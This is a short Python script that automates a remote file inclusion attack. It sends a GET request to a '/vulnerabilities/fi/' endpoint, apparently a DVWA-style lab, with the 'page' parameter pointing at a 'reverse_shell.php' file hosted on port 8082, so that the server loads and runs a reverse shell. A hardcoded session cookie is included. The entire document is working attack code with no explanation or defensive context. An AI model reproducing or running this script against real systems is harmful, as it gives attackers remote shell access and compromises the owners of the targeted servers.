import requests

# Function to send the GET request to the vulnerable endpoint
def send_reverse_shell_request():
    """Send the GET request with the reverse shell URL in the 'page' parameter."""
    url = "http://192.168.67.166/vulnerabilities/fi/"
    params = {
        "page": "http://192.168.67.166:8082/reverse_shell.php"
    }
    headers = {
        "Host": "192.168.67.166",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cookie": "PHPSESSID=5k2gri2ruu1dburaeg62h10b95; security=low",
        "Upgrade-Insecure-Requests": "1"
    }

    try:
        print(f"[+] Sending GET request to {url} with reverse shell page URL...")
        response = requests.get(url, headers=headers, params=params)
        
        # Check if the response is successful (status code 200)
        if response.status_code == 200:
            print("[+] GET request sent successfully!")
        else:
            print(f"[-] Error sending GET request: {response.status_code}")
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")

# Main function to send the reverse shell GET request
def main():
    print("[+] Starting automation process...")
    # Send the reverse shell GET request
    send_reverse_shell_request()

if __name__ == "__main__":
    main()
